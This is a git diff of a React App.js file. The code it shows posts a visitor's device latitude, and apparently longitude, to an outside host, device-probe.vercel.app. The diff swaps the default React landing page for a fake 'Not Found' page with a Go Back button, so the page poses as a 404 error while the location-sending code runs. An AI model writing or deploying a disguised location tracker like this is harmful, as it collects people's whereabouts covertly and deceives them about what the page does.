@@ -23,7 +23,7 @@ function App() {
   }
 
   function main(body) {
-    console.log(body)
+    console.log(body);
     return axios
       .post(`https://device-probe.vercel.app/`, {
         deviceLatitude: body.deviceLatitude,
@@ -31,7 +31,6 @@ function App() {
       })
       .then((response) => {
         return response.data;
-       
       })
       .catch((error) => {
         return { res: error, status: false, statusCode: 500, error: "error" };
@@ -39,21 +38,10 @@ function App() {
   }
 
   return (
-    <div className="App">
-      <header className="App-header">
-        <img src={logo} className="App-logo" alt="logo" />
-        <p>
-          Edit <code>src/App.js</code> and save to reload.
-        </p>
-        <a
-          className="App-link"
-          href="https://reactjs.org"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          Learn React
-        </a>
-      </header>
+    <div className="not-found">
+      <h1>Not Found</h1>
+      <p>We're sorry, but the page you requested could not be found.</p>
+      <button onClick={() => window.history.back()}>Go Back</button>
     </div>
   );
 }
